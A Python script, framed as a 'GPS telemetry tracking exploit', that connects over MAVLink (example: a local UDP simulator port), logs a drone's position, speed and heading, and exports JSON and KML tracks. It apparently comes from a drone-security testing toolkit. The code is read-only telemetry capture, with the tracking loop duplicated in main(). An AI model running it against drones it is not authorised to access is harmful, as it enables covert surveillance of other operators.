#!/usr/bin/env python3
"""
GPS Telemetry Tracking Exploit Script
Extracts and tracks drone GPS position in real-time
"""

import sys
import time
import json
import math
from pathlib import Path
from pymavlink import mavutil

def track_gps_position(connection, duration=60, output_file=None):
    """
    Track GPS position in real-time
    
    Args:
        connection: MAVLink connection object
        duration: Tracking duration in seconds (0 = infinite)
        output_file: Optional file to save track data
    """
    print("[*] Starting GPS telemetry tracking...")
    if duration > 0:
        print(f"[*] Duration: {duration} seconds")
    else:
        print("[*] Duration: infinite (Press Ctrl+C to stop)")
    
    positions = []
    start_time = time.time()
    
    try:
        while True:
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            # Get GPS position
            msg = connection.recv_match(type=['GLOBAL_POSITION_INT', 'GPS_RAW_INT'], blocking=True, timeout=1)
            if msg is None:
                continue
            
            if msg.get_type() == 'GLOBAL_POSITION_INT':
                lat = msg.lat / 1e7
                lon = msg.lon / 1e7
                alt = msg.alt / 1000.0  # Convert from mm to meters
                relative_alt = msg.relative_alt / 1000.0
                vx = msg.vx / 100.0  # Convert from cm/s to m/s
                vy = msg.vy / 100.0
                vz = msg.vz / 100.0
                hdg = msg.hdg / 100.0  # Convert from centi-degrees to degrees
                
            elif msg.get_type() == 'GPS_RAW_INT':
                lat = msg.lat / 1e7
                lon = msg.lon / 1e7
                alt = msg.alt / 1000.0
                relative_alt = alt  # GPS_RAW_INT doesn't have relative alt
                vx = vy = vz = 0.0
                hdg = 0.0
            
            else:
                continue
            
            timestamp = time.time()
            elapsed = timestamp - start_time
            
            position = {
                'timestamp': timestamp,
                'elapsed': elapsed,
                'latitude': lat,
                'longitude': lon,
                'altitude': alt,
                'relative_altitude': relative_alt,
                'velocity': {
                    'x': vx,
                    'y': vy,
                    'z': vz
                },
                'heading': hdg
            }
            
            positions.append(position)
            
            # Display position
            print(f"[{elapsed:.1f}s] GPS: lat={lat:.6f}, lon={lon:.6f}, alt={alt:.1f}m, "
                  f"rel_alt={relative_alt:.1f}m, hdg={hdg:.1f}Â°")
            
            if vx != 0 or vy != 0:
                speed = (vx**2 + vy**2)**0.5
                print(f"         Speed: {speed:.1f} m/s ({speed * 3.6:.1f} km/h)")
            
    except KeyboardInterrupt:
        print("\n[*] Stopping GPS tracking...")
    
    # Save to file if requested
    if output_file:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_path, 'w') as f:
            json.dump(positions, f, indent=2)
        
        print(f"\n[+] Saved {len(positions)} position points to {output_file}")
    
    # Display summary
    if positions:
        print("\n" + "=" * 60)
        print("GPS Tracking Summary")
        print("=" * 60)
        print(f"Total positions: {len(positions)}")
        print(f"Duration: {positions[-1]['elapsed']:.1f} seconds")
        
        lats = [p['latitude'] for p in positions]
        lons = [p['longitude'] for p in positions]
        alts = [p['altitude'] for p in positions]
        
        print(f"\nPosition Range:")
        print(f"  Latitude: {min(lats):.6f} to {max(lats):.6f}")
        print(f"  Longitude: {min(lons):.6f} to {max(lons):.6f}")
        print(f"  Altitude: {min(alts):.1f}m to {max(alts):.1f}m")
        
        # Calculate distance traveled
        if len(positions) > 1:
            total_distance = 0
            for i in range(1, len(positions)):
                p1 = positions[i-1]
                p2 = positions[i]
                # Simple distance calculation (Haversine would be more accurate)
                lat_diff = (p2['latitude'] - p1['latitude']) * 111000  # meters per degree
                lon_diff = (p2['longitude'] - p1['longitude']) * 111000 * abs(math.cos(math.radians(p1['latitude'])))
                distance = (lat_diff**2 + lon_diff**2)**0.5
                total_distance += distance
            
            print(f"  Estimated distance traveled: {total_distance:.1f}m ({total_distance/1000:.2f}km)")

def generate_kml(positions, output_file):
    """
    Generate KML file for Google Earth visualization
    
    Args:
        positions: List of position dictionaries
        output_file: Output KML file path
    """
    import math
    
    kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
<Document>
<name>Drone GPS Track</name>
<Placemark>
<name>Drone Path</name>
<LineString>
<coordinates>
"""
    
    for pos in positions:
        kml_content += f"{pos['longitude']},{pos['latitude']},{pos['altitude']} "
    
    kml_content += """
</coordinates>
</LineString>
</Placemark>
</Document>
</kml>
"""
    
    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    with open(output_path, 'w') as f:
        f.write(kml_content)
    
    print(f"[+] KML file generated: {output_file}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 gps_telemetry_tracking.py <connection> [options]")
        print("Example: python3 gps_telemetry_tracking.py udp:127.0.0.1:14550")
        print("Example: python3 gps_telemetry_tracking.py udp:127.0.0.1:14550 --duration 120 --save track.json")
        print("Example: python3 gps_telemetry_tracking.py udp:127.0.0.1:14550 --kml track.kml")
        print("\nOptions:")
        print("  --duration <sec>    Tracking duration (default: 60, 0 = infinite)")
        print("  --save <file>       Save track data to JSON file")
        print("  --kml <file>        Generate KML file for Google Earth")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    
    # Parse options
    duration = 60
    output_file = None
    kml_file = None
    
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--duration' and i + 1 < len(sys.argv):
            try:
                duration = int(sys.argv[i + 1])
                if duration < 0:
                    raise ValueError("Duration cannot be negative")
                if duration > 3600:
                    print("[!] Warning: Duration exceeds 1 hour")
            except (ValueError, TypeError) as e:
                print(f"[-] Invalid duration: {e}")
                sys.exit(1)
            i += 2
        elif sys.argv[i] == '--save' and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            # Validate output file path
            output_path = Path(output_file)
            try:
                output_path.parent.mkdir(parents=True, exist_ok=True)
                test_file = output_path.parent / ".write_test"
                test_file.touch()
                test_file.unlink()
            except (OSError, PermissionError) as e:
                print(f"[-] Cannot write to output file '{output_file}': {e}")
                sys.exit(1)
            i += 2
        elif sys.argv[i] == '--kml' and i + 1 < len(sys.argv):
            kml_file = sys.argv[i + 1]
            # Validate KML file path
            kml_path = Path(kml_file)
            try:
                kml_path.parent.mkdir(parents=True, exist_ok=True)
                test_file = kml_path.parent / ".write_test"
                test_file.touch()
                test_file.unlink()
            except (OSError, PermissionError) as e:
                print(f"[-] Cannot write to KML file '{kml_file}': {e}")
                sys.exit(1)
            i += 2
        else:
            i += 1
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Track GPS
    positions = []
    start_time = time.time()
    
    try:
        while True:
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            msg = connection.recv_match(type=['GLOBAL_POSITION_INT', 'GPS_RAW_INT'], blocking=True, timeout=1)
            if msg is None:
                continue
            
            if msg.get_type() == 'GLOBAL_POSITION_INT':
                lat = msg.lat / 1e7
                lon = msg.lon / 1e7
                alt = msg.alt / 1000.0
                relative_alt = msg.relative_alt / 1000.0
                vx = msg.vx / 100.0
                vy = msg.vy / 100.0
                vz = msg.vz / 100.0
                hdg = msg.hdg / 100.0
            elif msg.get_type() == 'GPS_RAW_INT':
                lat = msg.lat / 1e7
                lon = msg.lon / 1e7
                alt = msg.alt / 1000.0
                relative_alt = alt
                vx = vy = vz = 0.0
                hdg = 0.0
            else:
                continue
            
            timestamp = time.time()
            elapsed = timestamp - start_time
            
            position = {
                'timestamp': timestamp,
                'elapsed': elapsed,
                'latitude': lat,
                'longitude': lon,
                'altitude': alt,
                'relative_altitude': relative_alt,
                'velocity': {'x': vx, 'y': vy, 'z': vz},
                'heading': hdg
            }
            
            positions.append(position)
            
            print(f"[{elapsed:.1f}s] GPS: lat={lat:.6f}, lon={lon:.6f}, alt={alt:.1f}m")
            
    except KeyboardInterrupt:
        print("\n[*] Stopping GPS tracking...")
    
    # Save data
    if output_file:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w') as f:
            json.dump(positions, f, indent=2)
        print(f"\n[+] Saved {len(positions)} positions to {output_file}")
    
    if kml_file and positions:
        generate_kml(positions, kml_file)
    
    # Display summary
    if positions:
        print(f"\n[+] Tracked {len(positions)} GPS positions")

if __name__ == "__main__":
    main()
